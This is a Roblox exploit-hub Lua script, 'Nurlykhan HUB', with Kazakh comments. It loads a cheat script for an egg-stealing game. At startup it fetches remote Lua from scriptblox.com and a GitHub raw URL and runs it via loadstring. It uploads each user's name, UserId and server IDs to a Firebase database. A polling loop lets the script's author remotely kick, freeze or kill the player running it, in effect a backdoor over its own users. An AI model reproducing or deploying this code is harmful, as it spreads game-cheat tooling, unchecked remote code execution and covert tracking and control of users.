-- 1. ScriptBlox аналитикасы
pcall(function() 
    loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_6359c89f56ac", "1.0.0", false) 
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
local SETTINGS_URL = "https://play-lag-default-rtdb.firebaseio.com/Settings"

local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/Egg-Roblox-Delta-script-/refs/heads/main/StealAnEgg.lua"

-- АДМИН КОМАНДАЛАРЫН ТЕКСЕРУ ЦИКЛІ
task.spawn(function()
    while task.wait(1.5) do
        pcall(function()
            local res = request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "GET" })
            if res and res.StatusCode == 200 then
                local uData = HttpService:JSONDecode(res.Body)
                if type(uData) == "table" then
                    -- 1. KICK (ШЫҒАРУ) - БАЗАНЫ БІРДЕН ТАЗАЛАУ!
                    if uData.Kick == true then
                        -- Алдымен базадағы Kick статусын өшіреміз (қайта кіргенде қайтадан шығарып жібермес үшін)
                        request({
                            Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kick.json",
                            Method = "PUT",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode(false)
                        })
                        task.wait(0.2)
                        LocalPlayer:Kick("Nurlykhan HUB 👑: Админ сізді ойыннан шығарды!")
                    end

                    -- 2. Freeze / Unfreeze
                    if uData.Freeze == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            LocalPlayer.Character.HumanoidRootPart.Anchored = true
                        end
                    elseif uData.Freeze == false then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            LocalPlayer.Character.HumanoidRootPart.Anchored = false
                        end
                    end

                    -- 3. Kill
                    if uData.Kill == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                            LocalPlayer.Character.Humanoid.Health = 0
                        end
                        request({
                            Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kill.json",
                            Method = "PUT",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode(false)
                        })
                    end
                end
            end
        end)
    end
end)

if getgenv().NurlykhanHubLoaded == true then
    pcall(function() 
        local source = game:HttpGet(HUB_URL)
        if source and source ~= "" then loadstring(source)() end
    end)
    return
end

local currentPassword = "1921"
local updateData = {Enabled = false, Message = ""}

pcall(function()
    local passRes = request({ Url = SETTINGS_URL .. "/PasswordData.json", Method = "GET" })
    if passRes and passRes.StatusCode == 200 then
        local pData = HttpService:JSONDecode(passRes.Body)
        if type(pData) == "table" and pData.Password then
            if pData.ExpireTime == 0 or os.time() < pData.ExpireTime then
                currentPassword = pData.Password
            else
                currentPassword = "NONE"
            end
        end
    end

    local updateRes = request({ Url = SETTINGS_URL .. "/UpdateData.json", Method = "GET" })
    if updateRes and updateRes.StatusCode == 200 then
        local uData = HttpService:JSONDecode(updateRes.Body)
        if type(uData) == "table" then updateData = uData end
    end
end)

if updateData.Enabled == true then
    local CoreGui = game:GetService("CoreGui")
    local LockGui = Instance.new("ScreenGui")
    LockGui.Name = "NurlykhanLockGui"
    LockGui.ResetOnSpawn = false

    pcall(function() LockGui.Parent = CoreGui end)
    if not LockGui.Parent then LockGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 440, 0, 220)
    MainFrame.Position = UDim2.new(0.5, -220, 0.5, -110)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = LockGui
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 45)
    Title.BackgroundTransparency = 1
    Title.Text = "🚨 NURLYKHAN HUB - ЖАҢАРТУ ЖҮРІП ЖАТЫР 🚨"
    Title.TextColor3 = Color3.fromRGB(255, 150, 0)
    Title.TextSize = 15
    Title.Font = Enum.Font.SourceSansBold
    Title.Parent = MainFrame

    local MsgLabel = Instance.new("TextLabel")
    MsgLabel.Size = UDim2.new(0.9, 0, 0, 120)
    MsgLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
    MsgLabel.BackgroundTransparency = 1
    MsgLabel.Text = tostring(updateData.Message)
    MsgLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    MsgLabel.TextSize = 14
    MsgLabel.Font = Enum.Font.SourceSansBold
    MsgLabel.TextWrapped = true
    MsgLabel.Parent = MainFrame

    return
end

local function showUpdateScreen()
    getgenv().NurlykhanHubLoaded = true
    
    local success, err = pcall(function()
        local source = game:HttpGet(HUB_URL)
        if source and source ~= "" then loadstring(source)() end
    end)

    if success then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Nurlykhan HUB 👑",
            Text = "Скрипт сәтті қосылды!",
            Duration = 4
        })
    end
end

local function registerActiveUser()
    task.spawn(function()
        pcall(function()
            request({
                Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json",
                Method = "PUT",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    Username = LocalPlayer.Name,
                    Time = os.time(),
                    Kick = false,
                    Freeze = false,
                    Kill = false,
                    JobId = game.JobId,
                    PlaceId = game.PlaceId
                })
            })
        end)
    end)
    
    showUpdateScreen()
end

-- ПАРОЛЬ ТЕРЕЗЕСІ + 3D АВАТАР (СКИН)
if currentPassword == "NONE" then
    registerActiveUser()
else
    local CoreGui = game:GetService("CoreGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "NurlykhanHubPass"
    ScreenGui.ResetOnSpawn = false

    pcall(function() ScreenGui.Parent = CoreGui end)
    if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 420, 0, 220)
    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -110)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 170, 255)
    stroke.Thickness = 2
    stroke.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 35)
    Title.BackgroundTransparency = 1
    Title.Text = "Nurlykhan HUB 👑"
    Title.TextColor3 = Color3.fromRGB(255, 215, 0)
    Title.TextSize = 18
    Title.Font = Enum.Font.SourceSansBold
    Title.Parent = MainFrame

    local Viewport = Instance.new("ViewportFrame")
    Viewport.Size = UDim2.new(0, 140, 0, 160)
    Viewport.Position = UDim2.new(0.04, 0, 0.2, 0)
    Viewport.BackgroundTransparency = 1
    Viewport.Parent = MainFrame

    local worldModel = Instance.new("WorldModel")
    worldModel.Parent = Viewport

    local camera = Instance.new("Camera")
    camera.Parent = Viewport
    Viewport.CurrentCamera = camera

    task.spawn(function()
        pcall(function()
            local dummy = Players:CreateHumanoidModelFromUserId(LocalPlayer.UserId)
            dummy.Parent = worldModel
            dummy:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))

            local root = dummy:FindFirstChild("HumanoidRootPart") or dummy:FindFirstChild("Head")
            if root then
                camera.CFrame = CFrame.new(root.Position + Vector3.new(0, 0.5, 4.5), root.Position)
                
                local angle = 0
                local spinConnection
                spinConnection = RunService.RenderStepped:Connect(function(dt)
                    if not MainFrame or not MainFrame.Parent then 
                        spinConnection:Disconnect() 
                        return 
                    end
                    angle = angle + dt * 1.5
                    dummy:SetPrimaryPartCFrame(CFrame.new(0, 0, 0) * CFrame.Angles(0, angle, 0))
                end)
            end
        end)
    end)

    local PassBox = Instance.new("TextBox")
    PassBox.Size = UDim2.new(0.5, 0, 0, 38)
    PassBox.Position = UDim2.new(0.44, 0, 0.3, 0)
    PassBox.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    PassBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    PassBox.PlaceholderText = "Пароль енгізіңіз..."
    PassBox.Text = ""
    PassBox.TextSize = 14
    PassBox.Font = Enum.Font.SourceSans
    PassBox.Parent = MainFrame
    Instance.new("UICorner", PassBox).CornerRadius = UDim.new(0, 8)

    local SubmitBtn = Instance.new("TextButton")
    SubmitBtn.Size = UDim2.new(0.5, 0, 0, 38)
    SubmitBtn.Position = UDim2.new(0.44, 0, 0.58, 0)
    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    SubmitBtn.Text = "Кіру 🚀"
    SubmitBtn.TextSize = 16
    SubmitBtn.Font = Enum.Font.SourceSansBold
    SubmitBtn.Parent = MainFrame
    Instance.new("UICorner", SubmitBtn).CornerRadius = UDim.new(0, 8)

    SubmitBtn.MouseButton1Click:Connect(function()
        if PassBox.Text == currentPassword then
            ScreenGui:Destroy()
            registerActiveUser()
        else
            SubmitBtn.Text = "Пароль қате!"
            SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            task.wait(1.5)
            SubmitBtn.Text = "Кіру 🚀"
            SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        end
    end)
end
